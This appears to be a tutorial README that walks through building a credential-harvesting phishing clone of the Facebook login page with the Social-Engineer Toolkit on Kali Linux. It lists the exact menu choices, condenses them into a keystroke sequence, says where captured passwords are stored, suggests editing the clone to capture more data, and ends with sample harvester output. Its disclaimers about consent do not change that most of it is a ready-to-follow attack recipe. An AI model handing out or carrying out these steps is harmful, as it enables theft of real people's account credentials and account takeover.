# Cibersecurity: Phishing

# Creating a Phishing Attack on Facebook with Kali Linux for Demonstration and Learning Purposes

**Note:** 
This guide is for educational and demonstration purposes only. Never perform phishing attacks in real environments as it is illegal and unethical.
Use this project only in a controlled environment and with explicit consent from participants.
Replace www.facebook.com with any other website you want to clone for testing purposes.

## Step 1: Accessing Kali Linux with root privileges

```
sudo su
```

## Step 2: Launching the Setoolkit

```
setoolkit
```

## Step 3: Selecting the Attack Type

```
Select "1" for "Social-Engineering Attacks" from the main menu.
Then, select "2" for "Website Attack Vectors".
```

## Step 4: Choosing the Attack Method

```
Enter "3" to choose "Credential Harvester Attack Method".
Then, enter "3" again to select "Site Cloner".
```

## Step 5: Getting the Machine's IP Address

```
Type ifconfig to view the network interfaces of your machine.
Note the IP address displayed next to eth0 or wlan0 (your main network interface).
```

## Step 6: Setting the URL of the Site to Clone

```
Enter "1" to choose "Facebook".
Then, press Enter to confirm the selection.
```

## Step 7: Initiating the Cloning Process

```
The Setoolkit will start cloning the Facebook website.
Wait for the process to complete.
```

## Step 8: Starting the Web Server

```
Type "1" to start the Apache web server.
The Setoolkit will start the web server and display the URL of the cloned site.
```

## Step 9: Testing the Phishing Attack

```
Open a new browser and access the URL displayed by the Setoolkit.
You will see a page identical to the Facebook login page.
Enter fake credentials in the login fields.
Press Enter to "log in".
The fake credentials entered will be captured and stored by the Setoolkit.
```

## Step 10: Viewing the Captured Credentials

```
Type "2" to view the captured credentials.
The Setoolkit will display a list of login credentials entered by users during the test.
```

**Notes:**

The Setoolkit stores captured credentials in a file called creds.txt in the /root/.setoolkit/ directory.
You can modify the source code of the cloned site to capture other information besides login credentials.
Remember to use this project only for educational purposes and with explicit consent.

**Step-by-Step Code:**

```
sudo su
setoolkit
1
2
3
3
ifconfig (note the IP address)
1
1
1
2
```

**Use the code with caution.**

This project demonstrates how to create a simple phishing attack on Kali Linux for learning purposes. It is important to remember that conducting phishing attacks in real environments is illegal and unethical. Use this knowledge only for educational purposes and with explicit consent.

## Result

```
POSSIBLE USERNAME FIELD FOUND: skip_api_login=
PARAM: signed_next= BROADCAST_RUNNING=0
PARAM: trynum=1
PARAM: timezone=180
PARAM: lgnrnd=112556_dsDS
PARAM: lgnjs=1668201982
POSSIBLE PASSWORD FIELD FOUND:
POSSIBLE USERNAME FIELD FOUND: email=joe@gmail.com
PARAM: prefill_contact_point=
PARAM: prefill_source=
PARAM: prefill_type=
PARAM: first_prefill_source=
```
